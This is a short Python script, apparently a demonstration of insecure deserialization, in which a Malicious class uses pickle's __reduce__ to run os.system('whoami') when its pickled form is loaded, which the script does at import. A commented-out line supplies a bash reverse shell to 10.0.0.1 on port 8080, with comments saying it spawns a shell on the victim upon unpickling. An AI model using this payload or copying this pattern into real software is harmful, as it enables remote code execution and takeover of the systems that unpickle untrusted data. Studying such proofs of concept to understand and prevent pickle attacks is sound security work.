import os
import pickle
def fun(name,password):
    s = {"username":name,"password":password}
    safecode = pickle.dumps(s)
    print(safecode)
    return safecode

class Malicious:
  def __reduce__(self):
    cmd = "whoami"
    return (os.system,(cmd,))
    #return (os.system, ('bash -i >& /dev/tcp/10.0.0.1/8080 0>&1',))
    #can make the victim application call the following upon unpickling
    #This would spawn a reverse shell to the IP 10.0.0.1 on port 8080
a=Malicious()
str=pickle.dumps(a)
pickle.loads(str)

if __name__ == '__main__':
    u = input("Username : ")
    p = input("Password : ")
    yo_fun = fun(u,p)

